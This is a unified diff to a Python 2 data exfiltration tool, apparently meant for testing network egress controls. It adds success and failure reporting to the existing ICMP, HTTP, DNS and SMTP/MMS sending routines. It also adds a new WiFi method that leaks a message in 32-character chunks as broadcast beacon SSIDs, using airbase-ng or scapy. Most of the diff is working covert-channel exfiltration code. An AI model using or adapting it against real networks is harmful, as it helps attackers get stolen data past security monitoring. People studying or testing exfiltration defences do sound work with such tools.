@@ -8,7 +8,9 @@ class naishoexfiltration:
 		self.split = 0
 		self.hostname = ""
 		self.httpsplitrequest = message
-
+		self.wifi_interface = ""
+		self.wifi_mac = ""
+		self.reporting = [[]]
 	def naishosplit(self, num):
 		self.split = num
 		return [ self.message[start:start+self.split] for start in range(0, len(self.message), self.split) ]
@@ -88,7 +90,9 @@ class naishoexfiltration:
                                         time.sleep(1)
 			else:
 				pass
+			self.reporting.append(['10.1.1.45', self.hostname,'ICMP', 'n/a', 'Success'])
 		except:
+			self.reporting.append(['10.1.1.45', self.hostname,'ICMP', 'n/a', 'Failed'])
 			print "Error: Either the destination server is not up or Scapy is not installed" 
 			raw_input("Press Enter to continue...")
 			pass
@@ -118,7 +122,9 @@ class naishoexfiltration:
 			raw_input("Press Enter to continue...")
 			#resp = conn.getresponse()
 			#body = resp.read()
+			self.reporting.append(['10.1.1.45', self.hostname,'TCP', portnumber+'(HTTP)', 'Success'])
 		except:
+			self.reporting.append(['10.1.1.45', self.hostname,'TCP', portnumber+'(HTTP)', 'Failed'])
 			print "\n[-] HTTP is not permitted or you are pointing to a server not listening on this port!!!"
 			raw_input("Press Enter to continue...")
 			pass
@@ -193,7 +199,9 @@ class naishoexfiltration:
 					count = count +1
 			else:
 				pass
+			self.reporting.append(['10.1.1.45', self.hostname,'TCP','53(DNS)', 'Success'])
 		except:
+			self.reporting.append(['10.1.1.45', self.hostname,'TCP','53(DNS)', 'Failed'])
 			print "Error: Either Destination server is not listening over port 53 or scapy is not installed."
 			raw_input("Press Enter to continue...")
 	def naishohttpproxy(self):
@@ -257,11 +265,58 @@ class naishoexfiltration:
                                 print "\n\033[32m[+]\033[0m Text Has been sent."
                                 raw_input("Press Enter to continue...")
 				pass
+			self.reporting.append(['10.1.1.45', phonenumber+"@mms.att.net",'TCP','SMTP', 'Success'])
 		except:
+			self.reporting.append(['10.1.1.45', phonenumber+"@mms.att.net",'TCP','SMTP', 'Failed'])
 			print "[-] Server is not respnding to destination port!!!"
 			raw_input("Press Enter to continue...")
-
+		
 	def naishoshowdata(self):
 		banner1()
 		print self.message + "\n\n"
-		raw_input("Press Enter to continue...")	
+		raw_input("Press Enter to continue...")
+	
+
+	def timeout_command(self, command, timeout):
+		import subprocess, datetime, os, time, signal
+		start = datetime.datetime.now()
+		process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		while process.poll() is None:
+			time.sleep(0.1)
+			now = datetime.datetime.now()
+			if (now - start).seconds> timeout:
+				os.kill(process.pid, signal.SIGKILL)
+				os.waitpid(-1, os.WNOHANG)
+				return None
+		return process.stdout.read()
+
+
+	
+	def naishowifi(self):
+	#--------------------------------------------|
+	#               WIFI Exfil                   |
+	#--------------------------------------------|------------------------------------------------------------------------------------------------
+		import subprocess
+		self.wifi_interface = raw_input("Please Enter the monitor Wifi-interface: ")
+		self.wifi_mac = raw_input("\033[31mEnter the Wifi Mac Address for Exfiltration: \033[0m")
+		splitmessage = self.naishosplit(32)
+		count =0
+		try:
+			choice = raw_input("[1] Wireless SSID Exfiltration(airbase-ng)\n[2] Wireless SSID Exfiltration(scapy)\n\n")
+			if choice == str(1):
+				while (count < len(splitmessage)):
+					lol = self.timeout_command(["airbase-ng", "-a", self.wifi_mac, "--essid", splitmessage[count], "-c", "11", self.wifi_interface], 1)
+					print "[+] Sent packet " + splitmessage[count] + "\n"
+					count = count + 1
+			elif choice == str(2):
+				from scapy.all import *
+				while (count < len (splitmessage)):
+					ip = sendp(RadioTap(version=0,pad=0,len=13,notdecoded='\x02\x00\x00\x00\x00')/Dot11(subtype=8L,addr1='ff:ff:ff:ff:ff:ff', addr2='aa:aa:aa:aa:aa:aa', addr3='aa:aa:aa:aa:aa:aa')/Dot11Beacon(beacon_interval=100, )/Dot11Elt(ID='SSID', len=len(splitmessage[count]), info=splitmessage[count]), iface=self.wifi_interface)
+					print splitmessage[count]
+					count = count +1
+			self.reporting.append(['10.1.1.45', 'aa:aa:aa:aa:aa:aa','802.11','n/a', 'Success'])
+			raw_input("Press Enter to continue...") 
+		except:
+                        self.reporting.append(['10.1.1.45', 'aa:aa:aa:aa:aa:aa','802.11','n/a', 'Failed'])
+			print "Error: Either Destination server is not listening over port 53 or scapy is not installed."
+			raw_input("Press Enter to continue...")
